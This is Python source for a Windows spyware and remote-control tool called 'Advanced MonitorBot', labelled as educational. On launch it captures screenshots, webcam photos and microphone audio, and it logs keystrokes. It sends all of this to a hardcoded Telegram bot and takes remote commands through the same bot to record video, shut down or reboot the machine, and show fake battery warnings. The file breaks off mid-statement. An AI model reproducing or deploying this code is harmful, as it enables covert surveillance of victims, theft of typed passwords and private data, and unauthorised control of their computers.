"""
🎯 Advanced MonitorBot - Complete System Control
🚀 Version: 3.1 | Full Featured | All Bugs Fixed
📅 Created with ❤️ for Educational Purposes
"""

# ==================== AUTO DEPENDENCIES INSTALLER ====================
import subprocess
import sys
import os
import tempfile

def setup_environment():
    """Setup Python environment and install required packages"""
    print("🔧 Setting up MonitorBot environment...")
    
    required_packages = [
        "requests", "mss", "opencv-python", "numpy", 
        "sounddevice", "scipy", "psutil", "pynput", 
        "cryptography", "pillow"
    ]
    
    for package in required_packages:
        try:
            if package == "opencv-python":
                __import__("cv2")
            elif package == "pynput":
                __import__("pynput.keyboard")
            elif package == "cryptography":
                __import__("cryptography.hazmat")
            else:
                __import__(package)
            print(f"   ✅ {package}")
        except ImportError:
            print(f"   📦 Installing {package}...")
            try:
                subprocess.check_call(
                    [sys.executable, "-m", "pip", "install", package],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                print(f"   ✅ {package} installed")
            except Exception as e:
                print(f"   ❌ Failed to install {package}: {e}")

setup_environment()

# ==================== IMPORTS ====================
import ctypes
import time
import socket
import platform
import getpass
import threading
from datetime import datetime
import logging
import requests
import mss
import mss.tools
import cv2
import numpy as np
import sounddevice as sd
from scipy.io.wavfile import write
import psutil
import tkinter as tk
from threading import Thread
import re
from pynput import keyboard

try:
    import winsound
except ImportError:
    winsound = None

# ==================== CONFIGURATION ====================
class Config:
    """Configuration settings for MonitorBot"""
    # Paths
    CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
    TEMP_DIR = os.getenv("TEMP", r"C:\Windows\Temp")
    QUEUE_DIR = os.path.join(TEMP_DIR, "MonitorQueue")
    LOG_DIR = os.path.join(CURRENT_DIR, "logs")
    
    # Telegram
    TOKEN = "8375011972:AAF5NvgWpB_ERP1hqjmcrUpoMz3q8pd5JO4"
    CHAT_ID = "5846327099"
    
    # Capture settings
    AUDIO_DURATION = 30
    AUDIO_FS = 44100
    UPLOAD_TIMEOUT = 60
    WEBCAM_WARMUP = 1.0
    
    # System settings
    LOOP_DELAY = 30
    DEBUG_MODE = True
    
    def __init__(self):
        self.create_directories()
    
    def create_directories(self):
        """Create necessary directories"""
        os.makedirs(self.QUEUE_DIR, exist_ok=True)
        os.makedirs(self.LOG_DIR, exist_ok=True)

# Initialize config
config = Config()

# ==================== GLOBAL VARIABLES ====================
loop_running = False
loop_thread = None
monitor_active = True
offset = None
keylogger = None
audio_streamer = None

# Thread locks for safety
loop_lock = threading.Lock()
monitor_lock = threading.Lock()

# ==================== LOGGING SYSTEM ====================
class AdvancedLogger:
    """Advanced logging system"""
    
    def __init__(self):
        self.setup_logging()
    
    def setup_logging(self):
        """Setup logging configuration"""
        log_file = os.path.join(config.LOG_DIR, "monitorbot.log")
        
        logging.basicConfig(
            level=logging.DEBUG if config.DEBUG_MODE else logging.INFO,
            format='[%(asctime)s] %(levelname)-8s - %(message)s',
            datefmt='%Y-%m-%d %I:%M:%S %p',
            handlers=[
                logging.FileHandler(log_file, encoding='utf-8'),
                logging.StreamHandler()
            ]
        )
        
        self.logger = logging.getLogger()
        self.logger.info("🚀 Advanced MonitorBot Started")
    
    def log_info(self, message):
        """Info level logging"""
        self.logger.info(message)
    
    def log_error(self, message):
        """Error level logging"""
        self.logger.error(message)
    
    def log_debug(self, message):
        """Debug level logging"""
        if config.DEBUG_MODE:
            self.logger.debug(message)

# Initialize logger
logger = AdvancedLogger()

# ==================== UTILITY FUNCTIONS ====================
class SystemUtils:
    """System utility functions"""
    
    @staticmethod
    def timestamp_now():
        """Get current timestamp"""
        return datetime.now().strftime("%I:%M:%S %p — %Y-%m-%d")
    
    @staticmethod
    def network_available():
        """Check network connectivity"""
        try:
            socket.create_connection(("8.8.8.8", 53), timeout=5)
            return True
        except Exception:
            return False
    
    @staticmethod
    def is_admin():
        """Check if running as administrator"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except Exception:
            return False
    
    @staticmethod
    def run_as_admin():
        """Run as administrator"""
        try:
            if not SystemUtils.is_admin():
                ctypes.windll.shell32.ShellExecuteW(
                    None, "runas", sys.executable, " ".join(sys.argv), None, 1
                )
                sys.exit()
            return True
        except Exception as e:
            logger.log_error(f"Admin elevation failed: {e}")
            return False

# ==================== TELEGRAM BOT ====================
class TelegramBot:
    """Advanced Telegram Bot with enhanced features"""
    
    def __init__(self, token=config.TOKEN, chat_id=config.CHAT_ID):
        self.token = token
        self.chat_id = chat_id
        self.session = requests.Session()
        self.session.timeout = config.UPLOAD_TIMEOUT
    
    def _api_request(self, method, data=None, files=None):
        """Make Telegram API request"""
        url = f"https://api.telegram.org/bot{self.token}/{method}"
        
        try:
            if files:
                response = self.session.post(url, data=data, files=files, timeout=config.UPLOAD_TIMEOUT)
            else:
                response = self.session.post(url, data=data, timeout=config.UPLOAD_TIMEOUT)
            
            logger.log_debug(f"Telegram API: {method} - Status: {response.status_code}")
            return response
            
        except Exception as e:
            logger.log_error(f"Telegram API error ({method}): {e}")
            return None
    
    def send_message(self, text):
        """Send message to Telegram"""
        max_retries = 3
        
        for attempt in range(max_retries):
            try:
                data = {
                    "chat_id": self.chat_id,
                    "text": text,
                    "parse_mode": "Markdown"
                }
                
                response = self._api_request("sendMessage", data=data)
                
                if response and response.status_code == 200:
                    return True
                else:
                    logger.log_error(f"Send message failed (attempt {attempt + 1})")
                    time.sleep(2)
                    
            except Exception as e:
                logger.log_error(f"Send message error (attempt {attempt + 1}): {e}")
                time.sleep(2)
        
        return False
    
    def send_file(self, file_path, file_type="document", caption=None):
        """Send file to Telegram"""
        if not os.path.exists(file_path):
            logger.log_error(f"File not found: {file_path}")
            return False
        
        try:
            # Map file types to methods
            method_map = {
                "photo": "sendPhoto",
                "audio": "sendAudio",
                "document": "sendDocument",
                "video": "sendVideo"
            }
            
            method = method_map.get(file_type, "sendDocument")
            
            with open(file_path, "rb") as file:
                files = {file_type: file}
                data = {"chat_id": self.chat_id}
                
                if caption:
                    data["caption"] = caption
                
                response = self._api_request(method, data=data, files=files)
                
                if response and response.status_code == 200:
                    logger.log_info(f"File sent: {file_path}")
                    return True
                else:
                    logger.log_error(f"File send failed: {file_path}")
                    return False
                    
        except Exception as e:
            logger.log_error(f"Send file error: {e}")
            return False

# ==================== CAPTURE SYSTEM ====================
class CaptureManager:
    """Advanced capture management system"""
    
    def __init__(self, queue_dir=config.QUEUE_DIR):
        self.queue_dir = queue_dir
        os.makedirs(queue_dir, exist_ok=True)
    
    def capture_desktop(self):
        """Capture desktop screenshot"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = os.path.join(self.queue_dir, f"desktop_{timestamp}.png")
            
            with mss.mss() as sct:
                # Capture primary monitor
                monitor = sct.monitors[1]
                screenshot = sct.grab(monitor)
                mss.tools.to_png(screenshot.rgb, screenshot.size, output=path)
            
            self._add_timestamp(path)
            logger.log_info(f"Desktop captured: {path}")
            return path
            
        except Exception as e:
            logger.log_error(f"Desktop capture failed: {e}")
            return None
    
    def capture_webcam(self):
        """Capture webcam image"""
        camera = None
        max_attempts = 3
        
        for attempt in range(max_attempts):
            try:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                path = os.path.join(self.queue_dir, f"webcam_{timestamp}.jpg")
                
                # Improved webcam initialization
                camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
                camera.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                camera.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
                camera.set(cv2.CAP_PROP_FPS, 30)
                
                if not camera.isOpened():
                    logger.log_error(f"Webcam not available (attempt {attempt + 1})")
                    time.sleep(1)
                    continue
                
                # Camera warmup with timeout
                start_time = time.time()
                while time.time() - start_time < config.WEBCAM_WARMUP:
                    ret, frame = camera.read()
                    if not ret:
                        break
                    time.sleep(0.1)
                
                success, frame = camera.read()
                
                if success and frame is not None:
                    cv2.imwrite(path, frame, [cv2.IMWRITE_JPEG_QUALITY, 85])
                    self._add_timestamp(path)
                    logger.log_info(f"Webcam captured: {path}")
                    return path
                else:
                    logger.log_error(f"Webcam frame capture failed (attempt {attempt + 1})")
                    
            except Exception as e:
                logger.log_error(f"Webcam capture attempt {attempt + 1} failed: {e}")
                
            finally:
                # ✅ FIXED: Always release camera
                if camera:
                    camera.release()
                    time.sleep(0.5)  # Give time for release
        
        logger.log_error("All webcam capture attempts failed")
        return None
    
    def record_audio(self, duration=config.AUDIO_DURATION):
        """Record audio from microphone"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = os.path.join(self.queue_dir, f"audio_{timestamp}.wav")
            
            frames = int(duration * config.AUDIO_FS)
            
            # ✅ FIXED: Better audio recording with error handling
            recording = sd.rec(
                frames, 
                samplerate=config.AUDIO_FS, 
                channels=1, 
                dtype='float32',
                blocking=True
            )
            sd.wait()  # Wait for recording to complete
            
            if recording is None or recording.size == 0:
                logger.log_error("Audio recording empty")
                return None
            
            # Normalize audio safely
            if np.any(recording):
                max_val = np.max(np.abs(recording))
                if max_val > 0:
                    recording = recording / max_val
                else:
                    recording = np.zeros_like(recording)
                
                write(path, config.AUDIO_FS, (recording * 32767).astype(np.int16))
                logger.log_info(f"Audio recorded: {path}")
                return path
            else:
                logger.log_error("Audio recording contains no data")
                return None
                
        except Exception as e:
            logger.log_error(f"Audio recording failed: {e}")
            return None
    
    def record_video(self, duration=30):
        """Record video from webcam"""
        camera = None
        video_writer = None
        
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            path = os.path.join(self.queue_dir, f"video_{timestamp}.avi")
            
            camera = cv2.VideoCapture(0, cv2.CAP_DSHOW)
            
            if not camera.isOpened():
                logger.log_error("Cannot open webcam for video")
                return None
            
            # Get camera properties
            frame_width = int(camera.get(cv2.CAP_PROP_FRAME_WIDTH))
            frame_height = int(camera.get(cv2.CAP_PROP_FRAME_HEIGHT))
            fps = 20.0
            
            # Setup video writer
            fourcc = cv2.VideoWriter_fourcc(*'XVID')
            video_writer = cv2.VideoWriter(path, fourcc, fps, (frame_width, frame_height))
            
            start_time = time.time()
            
            while (time.time() - start_time) < duration:
                success, frame = camera.read()
                if success:
                    # Add timestamp to video frame
                    cv2.putText(
                        frame, SystemUtils.timestamp_now(), (10, 30),
                        cv2.FONT_HERSHEY_SIMPLEX, 0.6, (0, 255, 255), 2
                    )
                    video_writer.write(frame)
                else:
                    break
            
            logger.log_info(f"Video recorded: {path}")
            return path
            
        except Exception as e:
            logger.log_error(f"Video recording failed: {e}")
            return None
            
        finally:
            if camera:
                camera.release()
            if video_writer:
                video_writer.release()
    
    def _add_timestamp(self, image_path):
        """Add timestamp to image"""
        try:
            image = cv2.imread(image_path)
            if image is None:
                return
            
            timestamp = SystemUtils.timestamp_now()
            font = cv2.FONT_HERSHEY_SIMPLEX
            
            # Add background for text
            text_size = cv2.getTextSize(timestamp, font, 0.6, 2)[0]
            cv2.rectangle(
                image, (5, image.shape[0] - text_size[1] - 10),
                (text_size[0] + 15, image.shape[0] - 5), (0, 0, 0), -1
            )
            
            # Add timestamp text
            cv2.putText(
                image, timestamp, (10, image.shape[0] - 10),
                font, 0.6, (0, 255, 255), 2, cv2.LINE_AA
            )
            
            cv2.imwrite(image_path, image)
            
        except Exception as e:
            logger.log_error(f"Timestamp add failed: {e}")

# ==================== KEYLOGGER SYSTEM ====================
class KeyLogger:
    """Advanced keylogging system"""
    
    def __init__(self, bot):
        self.bot = bot
        self.log = ""
        self.last_sent = time.time()
        self.is_running = False
        self.listener = None
    
    def on_press(self, key):
        """Key press event handler"""
        try:
            if not self.is_running:
                return False
            
            # Handle different key types
            if hasattr(key, 'char') and key.char:
                self.log += key.char
            else:
                # Special keys mapping
                key_map = {
                    keyboard.Key.space: ' ',
                    keyboard.Key.enter: '\n[ENTER]\n',
                    keyboard.Key.tab: '[TAB]',
                    keyboard.Key.backspace: '[BACKSPACE]',
                    keyboard.Key.esc: '[ESC]',
                    keyboard.Key.shift: '[SHIFT]',
                    keyboard.Key.ctrl: '[CTRL]',
                    keyboard.Key.alt: '[ALT]'
                }
                self.log += key_map.get(key, f'[{key.name.upper()}]')
            
            # Auto-send conditions
            if len(self.log) >= 500 or (time.time() - self.last_sent) > 120:
                self.send_log()
                
        except Exception as e:
            logger.log_error(f"Keylogger error: {e}")
    
    def send_log(self):
        """Send keylog data"""
        if len(self.log.strip()) < 10:
            return
        
        try:
            timestamp = int(time.time())
            log_file = os.path.join(config.QUEUE_DIR, f"keylog_{timestamp}.txt")
            
            with open(log_file, 'w', encoding='utf-8') as file:
                file.write(f"🔑 Keylogger Data - {SystemUtils.timestamp_now()}\n")
                file.write("=" * 50 + "\n")
                file.write(self.log + "\n")
                file.write("=" * 50 + "\n")
                file.write(f"Total Characters: {len(self.log)}\n")
            
            # Send via Telegram
            if self.bot.send_file(log_file, "document", "⌨️ Keylogger Data"):
                self.log = ""
                self.last_sent = time.time()
            
            # Cleanup
            try:
                os.remove(log_file)
            except Exception:
                pass
                
        except Exception as e:
            logger.log_error(f"Keylog send failed: {e}")
    
    def start(self):
        """Start keylogger"""
        if self.is_running:
            return True
        
        try:
            self.is_running = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.daemon = True
            self.listener.start()
            logger.log_info("Keylogger started successfully")
            return True
        except Exception as e:
            logger.log_error(f"Keylogger start failed: {e}")
            return False
    
    def stop(self):
        """Stop keylogger"""
        self.is_running = False
        if self.listener:
            self.listener.stop()
        self.send_log()  # Send final log
        logger.log_info("Keylogger stopped")

# ==================== LOCATION SERVICES ====================
class LocationService:
    """Location and system information services"""
    
    @staticmethod
    def get_geo_info():
        """Get geographical information"""
        try:
            response = requests.get("https://ipinfo.io/json", timeout=10)
            if response.status_code == 200:
                data = response.json()
                location = data.get('loc', '').split(',')
                
                return {
                    'ip': data.get('ip', 'N/A'),
                    'city': data.get('city', 'N/A'),
                    'region': data.get('region', 'N/A'),
                    'country': data.get('country', 'N/A'),
                    'latitude': float(location[0]) if len(location) == 2 else None,
                    'longitude': float(location[1]) if len(location) == 2 else None
                }
        except Exception as e:
            logger.log_error(f"Geo info failed: {e}")
        
        return {
            'ip': 'N/A', 'city': 'N/A', 'region': 'N/A', 
            'country': 'N/A', 'latitude': None, 'longitude': None
        }
    
    @staticmethod
    def get_system_info():
        """Get comprehensive system information"""
        try:
            hostname = platform.node()
            username = getpass.getuser()
            os_info = f"{platform.system()} {platform.release()}"
            
            # CPU and RAM usage
            cpu_usage = psutil.cpu_percent()
            ram_usage = psutil.virtual_memory().percent
            ram_total = round(psutil.virtual_memory().total / (1024 ** 3), 2)
            
            # Battery info
            battery = psutil.sensors_battery()
            if battery:
                battery_status = f"{battery.percent}% ({'Charging' if battery.power_plugged else 'Battery'})"
            else:
                battery_status = "N/A"
            
            # Disk usage
            disk_usage = psutil.disk_usage('/')
            disk_total = round(disk_usage.total / (1024 ** 3), 2)
            disk_used = round(disk_usage.used / (1024 ** 3), 2)
            
            return {
                'hostname': hostname,
                'username': username,
                'os': os_info,
                'cpu_usage': cpu_usage,
                'ram_usage': ram_usage,
                'ram_total': ram_total,
                'battery': battery_status,
                'disk_total': disk_total,
                'disk_used': disk_used,
                'network': "Connected" if SystemUtils.network_available() else "Disconnected"
            }
            
        except Exception as e:
            logger.log_error(f"System info failed: {e}")
            return {}

# ==================== SPECIAL EFFECTS ====================
class SpecialEffects:
    """Special visual and audio effects"""
    
    @staticmethod
    def show_note_popup(message, duration=5):
        """Show popup note on screen"""
        def show_popup():
            try:
                root = tk.Tk()
                root.withdraw()
                
                # Create popup window
                popup = tk.Toplevel(root)
                popup.overrideredirect(True)
                popup.attributes("-topmost", True)
                popup.attributes("-alpha", 0.9)
                
                # Center window
                screen_width = popup.winfo_screenwidth()
                screen_height = popup.winfo_screenheight()
                window_width = 600
                window_height = 150
                
                x = (screen_width - window_width) // 2
                y = (screen_height - window_height) // 2
                
                popup.geometry(f"{window_width}x{window_height}+{x}+{y}")
                popup.configure(bg='#1a1a1a')
                
                # Message label
                label = tk.Label(
                    popup, text=message, font=("Arial", 16, "bold"),
                    fg="#00ff00", bg="#1a1a1a", wraplength=550, 
                    justify="center"
                )
                label.pack(expand=True, fill="both", padx=20, pady=20)
                
                # Auto close
                popup.after(int(duration * 1000), popup.destroy)
                popup.mainloop()
                
            except Exception as e:
                logger.log_error(f"Popup note error: {e}")
        
        thread = Thread(target=show_popup, daemon=True)
        thread.start()
    
    @staticmethod
    def fake_battery_overlay(percent=10, duration=8):
        """Show fake low battery overlay"""
        def show_overlay():
            try:
                root = tk.Tk()
                root.attributes('-fullscreen', True)
                root.attributes('-topmost', True)
                root.configure(bg='black')
                root.attributes('-alpha', 0.7)
                
                # Warning message
                label = tk.Label(
                    root, 
                    text=f"⚠️ CRITICALLY LOW BATTERY - {percent}% REMAINING\n\nConnect to power immediately!",
                    font=("Arial", 24, "bold"), 
                    fg="red", bg="black", justify="center"
                )
                label.pack(expand=True)
                
                # Warning sound
                if winsound:
                    winsound.Beep(1000, 500)
                
                # Auto close
                root.after(int(duration * 1000), root.destroy)
                root.mainloop()
                
            except Exception as e:
                logger.log_error(f"Battery overlay error: {e}")
        
        Thread(target=show_overlay, daemon=True).start()
    
    @staticmethod
    def fake_battery_shutdown():
        """Simulate battery drop and shutdown"""
        def simulate_shutdown():
            try:
                # Simulate battery drop
                for percent in [50, 30, 15, 5]:
                    SpecialEffects.fake_battery_overlay(percent, 5)
                    time.sleep(10)
                
                # Final warning and shutdown
                SpecialEffects.fake_battery_overlay(1, 3)
                time.sleep(5)
                os.system("shutdown /s /t 5")
                
            except Exception as e:
                logger.log_error(f"Battery shutdown simulation error: {e}")
        
        Thread(target=simulate_shutdown, daemon=True).start()

# ==================== LIVE AUDIO STREAMING ====================
class LiveAudioStream:
    """Live audio streaming system"""
    
    def __init__(self, bot, duration=60):
        self.bot = bot
        self.duration = duration
        self.is_streaming = False
        self.audio_data = []
        self.stream = None
    
    def audio_callback(self, indata, frames, time_info, status):
        """Audio stream callback"""
        if status:
            logger.log_error(f"Audio stream status: {status}")
        if self.is_streaming:
            self.audio_data.append(indata.copy())
    
    def start_stream(self):
        """Start audio streaming"""
        if self.is_streaming:
            return None
        
        try:
            self.is_streaming = True
            self.audio_data = []
            
            # Start audio stream
            self.stream = sd.InputStream(
                samplerate=config.AUDIO_FS,
                channels=1,
                callback=self.audio_callback,
                dtype='float32'
            )
            self.stream.start()
            
            # Record for specified duration
            start_time = time.time()
            while (time.time() - start_time) < self.duration and self.is_streaming:
                time.sleep(0.1)
            
            self.stream.stop()
            self.stream.close()
            self.stream = None
            
            # Save audio file
            if self.audio_data:
                audio_array = np.concatenate(self.audio_data, axis=0)
                output_path = os.path.join(config.QUEUE_DIR, f"live_audio_{int(time.time())}.wav")
                
                # Normalize audio
                if np.max(np.abs(audio_array)) > 0:
                    audio_array = audio_array / np.max(np.abs(audio_array))
                
                write(output_path, config.AUDIO_FS, np.int16(audio_array * 32767))
                
                self.is_streaming = False
                logger.log_info(f"Live audio stream saved: {output_path}")
                return output_path
            
            self.is_streaming = False
            return None
            
        except Exception as e:
            logger.log_error(f"Live audio streaming failed: {e}")
            self.is_streaming = False
            if self.stream:
                try:
                    self.stream.close()
                except:
                    pass
            return None
    
    def stop_stream(self):
        """Stop audio streaming"""
        self.is_streaming = False

# ==================== MAIN LOOP SYSTEM ====================
class MainLoop:
    """Main monitoring loop system"""
    
    def __init__(self, bot, capture_manager):
        self.bot = bot
        self.capture_manager = capture_manager
    
    def worker(self):
        """Main loop worker"""
        global loop_running
        
        while loop_running:
            try:
                start_time = time.time()
                
                if monitor_active:
                    # Capture all data types
                    files_to_send = []
                    
                    # Audio recording
                    audio_file = self.capture_manager.record_audio()
                    if audio_file:
                        files_to_send.append((audio_file, "audio"))
                    
                    # Desktop screenshot
                    desktop_file = self.capture_manager.capture_desktop()
                    if desktop_file:
                        files_to_send.append((desktop_file, "photo"))
                    
                    # Webcam capture
                    webcam_file = self.capture_manager.capture_webcam()
                    if webcam_file:
                        files_to_send.append((webcam_file, "photo"))
                    
                    # Send files if network available
                    if SystemUtils.network_available():
                        for file_path, file_type in files_to_send:
                            if os.path.exists(file_path):
                                self.bot.send_file(file_path, file_type)
                                try:
                                    os.remove(file_path)
                                except Exception as e:
                                    logger.log_error(f"File cleanup failed: {e}")
                
                # Calculate sleep time
                elapsed = time.time() - start_time
                sleep_time = max(1, config.LOOP_DELAY - elapsed)
                time.sleep(sleep_time)
                
            except Exception as e:
                logger.log_error(f"Loop worker error: {e}")
                time.sleep(5)  # Wait before retry

def start_loop(bot, capture_manager):
    """Start main monitoring loop"""
    global loop_running, loop_thread
    
    if loop_running:
        return
    
    with loop_lock:
        loop_running = True
        main_loop = MainLoop(bot, capture_manager)
        loop_thread = Thread(target=main_loop.worker, daemon=True)
        loop_thread.start()
        logger.log_info("Main monitoring loop started")

def stop_loop(bot=None):
    """Stop main monitoring loop"""
    global loop_running
    with loop_lock:
        loop_running = False
    if bot:
        bot.send_message("🛑 Monitoring loop stopped")
    logger.log_info("Main monitoring loop stopped")

# ==================== STARTUP SYSTEM ====================
class StartupManager:
    """Startup and initialization system"""
    
    @staticmethod
    def startup_capture(bot, capture_manager):
        """Perform startup captures"""
        try:
            bot.send_message("🚀 *System Startup Detected*")
            
            # Send desktop screenshot
            desktop = capture_manager.capture_desktop()
            if desktop:
                bot.send_file(desktop, "photo", "🖥️ Desktop Screenshot")
                os.remove(desktop)
            
            # Send webcam photo
            webcam = capture_manager.capture_webcam()
            if webcam:
                bot.send_file(webcam, "photo", "📷 Webcam Photo")
                os.remove(webcam)
                
        except Exception as e:
            logger.log_error(f"Startup capture error: {e}")

# ==================== COMMAND HANDLER ====================
class CommandHandler:
    """Telegram command handler"""
    
    def __init__(self, bot, capture_manager):
        self.bot = bot
        self.capture_manager = capture_manager
        self.audio_streamer = None
    
    def handle_commands(self):
        """Main command handling loop"""
        global offset, monitor_active, config, keylogger
        
        # Initialize keylogger
        if keylogger is None:
            keylogger = KeyLogger(self.bot)
        
        error_count = 0
        max_errors = 5
        
        while True:
            try:
                params = {"timeout": 30, "allowed_updates": ["message"]}
                if offset is not None:
                    params["offset"] = offset + 1
                else:
                    params["offset"] = None
                
                response = requests.get(
                    f"https://api.telegram.org/bot{config.TOKEN}/getUpdates",
                    params=params, 
                    timeout=35
                )
                
                if response.status_code != 200:
                    logger.log_error(f"Telegram API error: {response.status_code}")
                    error_count += 1
                    if error_count >= max_errors:
                        logger.log_error("Too many API errors, restarting...")
                        break
                    time.sleep(10)
                    continue
                
                # Reset error count on success
                error_count = 0
                
                updates = response.json().get("result", [])
                
                for update in updates:
                    offset = update["update_id"]
                    message = update.get("message", {})
                    text = message.get("text", "").strip()
                    chat_id = str(message.get("chat", {}).get("id"))
                    
                    if chat_id != config.CHAT_ID:
                        continue
                    
                    logger.log_info(f"Command received: {text}")
                    
                    # ✅ FIXED: Handle command in separate thread to avoid blocking
                    Thread(target=self.process_command, args=(text,), daemon=True).start()
                
                time.sleep(1)
                
            except requests.exceptions.Timeout:
                logger.log_error("Telegram API timeout")
                time.sleep(5)
            except requests.exceptions.ConnectionError:
                logger.log_error("Telegram API connection error")
                time.sleep(10)
            except Exception as e:
                logger.log_error(f"Command handler error: {e}")
                error_count += 1
                if error_count >= max_errors:
                    logger.log_error("Too many errors in command handler, restarting...")
                    break
                time.sleep(5)
    
    def process_command(self, text):
        """Process individual commands"""
        global monitor_active, config
        
        # 🔍 Monitoring Commands
        if text == "/monitoron":
            with monitor_lock:
                monitor_active = True
            self.bot.send_message("🟢 Monitoring Enabled")
        
        elif text == "/monitoroff":
            with monitor_lock:
                monitor_active = False
            self.bot.send_message("🟡 Monitoring Disabled")
        
        elif text == "/screenshot":
            desktop = self.capture_manager.capture_desktop()
            if desktop:
                self.bot.send_file(desktop, "photo", "🖥️ Desktop Screenshot")
                os.remove(desktop)
            else:
                self.bot.send_message("❌ Screenshot failed")
        
        elif text == "/photo":
            webcam = self.capture_manager.capture_webcam()
            if webcam:
                self.bot.send_file(webcam, "photo", "📷 Webcam Photo")
                os.remove(webcam)
            else:
                self.bot.send_message("❌ Webcam capture failed")
        
        elif text == "/status":
            system_info = LocationService.get_system_info()
            status_msg = f"💻 CPU: {system_info.get('cpu_usage', 'N/A')}% | RAM: {system_info.get('ram_usage', 'N/A')}%"
            self.bot.send_message(status_msg)
        
        # ⌨️ Advanced Features
        elif text == "/keylogstart":
            if keylogger.start():
                self.bot.send_message("⌨️ Keylogger Started")
            else:
                self.bot.send_message("❌ Keylogger Start Failed")
        
        elif text == "/keylogstop":
            keylogger.stop()
            self.bot.send_message("⏹️ Keylogger Stopped")
        
        elif text == "/keylogsend":
            keylogger.send_log()
            self.bot.send_message("📤 Keylogs Sent")
        
        elif text.startswith("/recordvideo"):
            try:
                duration = 30
                parts = text.split()
                if len(parts) > 1:
                    duration = min(int(parts[1]), 120)  # Max 2 minutes
                
                self.bot.send_message(f"🎥 Recording {duration}s video...")
                video_file = self.capture_manager.record_video(duration)
                if video_file:
                    self.bot.send_file(video_file, "document", f"📹 {duration}s Video Recording")
                    os.remove(video_file)
                else:
                    self.bot.send_message("❌ Video recording failed")
            except Exception as e:
                self.bot.send_message(f"❌ Video error: {e}")
        
        elif text.startswith("/livestream"):
            try:
                duration = 60
                parts = text.split()
                if len(parts) > 1:
                    duration = min(int(parts[1]), 300)  # Max 5 minutes
                
                if self.audio_streamer is None:
                    self.audio_streamer = LiveAudioStream(self.bot)
                
                self.bot.send_message(f"🎤 Streaming {duration}s audio...")
                audio_file = self.audio_streamer.start_stream()
                if audio_file:
                    self.bot.send_file(audio_file, "audio", f"🎤 {duration}s Audio Stream")
                    os.remove(audio_file)
                else:
                    self.bot.send_message("❌ Audio streaming failed")
            except Exception as e:
                self.bot.send_message(f"❌ Audio error: {e}")
        
        # ⚡ System Commands
        elif text == "/startloop":
            start_loop(self.bot, self.capture_manager)
            self.bot.send_message("🔄 Auto-capture Started")
        
        elif text == "/stoploop":
            stop_loop(self.bot)
            self.bot.send_message("⏹️ Auto-capture Stopped")
        
        elif text.startswith("/setdelay"):
            try:
                new_delay = int(text.split()[1])
                if new_delay >= 5:
                    config.LOOP_DELAY = new_delay
                    self.bot.send_message(f"⏱️ Loop delay set to {config.LOOP_DELAY}s")
                else:
                    self.bot.send_message("❌ Delay must be ≥5 seconds")
            except:
                self.bot.send_message("❌ Usage: /setdelay <seconds>")
        
        elif text == "/shutdown":
            os.system("shutdown /s /t 5")
            self.bot.send_message("🔌 Shutting down in 5 seconds...")
        
        elif text == "/reboot":
            os.system("shutdown /r /t 5")
            self.bot.send_message("🔄 Rebooting in 5 seconds...")
        
        elif text == "/lock":
            ctypes.windll.user32.LockWorkStation()
            self.bot.send_message("🔒 Workstation Locked")
        
        # 🎭 Special Effects
        elif text.startswith("/fakelow"):
            try:
                percent = 10
                parts = text.split()
                if len(parts) > 1:
                    percent = max(1, min(100, int(parts[1])))
                SpecialEffects.fake_battery_overlay(percent)
                self.bot.send_message(f"🔋 Fake battery {percent}% shown")
            except:
                self.bot.send_message("❌ Usage: /fakelow [percent]")
        
        elif text == "/fakelowshutdown":
            SpecialEffects.fake_battery_shutdown()
            self.bot.send_message("🔋 Fake battery shutdown started")
        
        elif text.startswith("/note"):
            message = text[5:].strip()
            if message:
                SpecialEffects.show_note_popup(message)
                self.bot.send_message(f"📝 Note shown: {message}")
            else:
                self.bot.send_message("❌ Usage: /note <message>")
        
        elif text == "/help":
            self.bot.send_message(self.get_help_text())
        
        else:
            self.bot.send_message("❓ Unknown command. Use /help for list.")
    
    @staticmethod
    def get_help_text():
        """Get help text"""
        return """
🎯 *Advanced MonitorBot - Command List*

🔍 *Monitoring*
• `/monitoron` - Start Monitoring
• `/monitoroff` - Stop Monitoring  
• `/screenshot` - Desktop Screenshot
• `/photo` - Webcam Photo
• `/status` - System Status

⌨️ *Advanced Features*
• `/keylogstart` - Start Keylogger
• `/keylogstop` - Stop Keylogger
• `/keylogsend` - Send Keylogs
• `/recordvideo [sec]` - Record Video
• `/livestream [sec]` - Live Audio

⚡ *System Control*
• `/startloop` - Start Auto-capture
• `/stoploop` - Stop Auto-capture
• `/setdelay N` - Set Loop Delay
• `/shutdown` - Shutdown PC
• `/reboot` - Reboot PC
• `/lock` - Lock Workstation

🎭 *Special Effects*
• `/fakelow [%]` - Fake Battery
• `/fakelowshutdown` - Fake Shutdown
• `/note <msg>` - Popup Note

🆘 *Help*
• `/help` - This Message

🔧 *Version 3.1* - All Bugs Fixed | Stable Release
"""

# ==================== MAIN APPLICATION ====================
def main():
    """Main application entry point"""
    global keylogger
    
    try:
        # Set working directory
        os.chdir(config.CURRENT_DIR)
        logger.log_info("🚀 Advanced MonitorBot Starting...")
        
        # Initialize components
        bot = TelegramBot()
        capture_manager = CaptureManager()
        keylogger = KeyLogger(bot)
        
        # Send startup message
        if SystemUtils.network_available():
            bot.send_message(f"🚀 *Advanced MonitorBot v3.1 Started*\n\n🕒 {SystemUtils.timestamp_now()}")
            
            # Perform startup captures in background
            Thread(
                target=StartupManager.startup_capture,
                args=(bot, capture_manager),
                daemon=True
            ).start()
        
        # Start command handler
        command_handler = CommandHandler(bot, capture_manager)
        command_thread = Thread(target=command_handler.handle_commands, daemon=True)
        command_thread.start()
        
        # Start main monitoring loop
        start_loop(bot, capture_manager)
        
        logger.log_info("🎯 MonitorBot fully operational")
        
        # Keep-alive loop
        while True:
            time.sleep(10)
            
            # Health checks
            if not loop_running:
                logger.log_info("Main loop stopped, restarting...")
                start_loop(bot, capture_manager)
            
            # Periodic status updates (every 5 minutes)
            if int(time.time()) % 300 == 0:
                if SystemUtils.network_available():
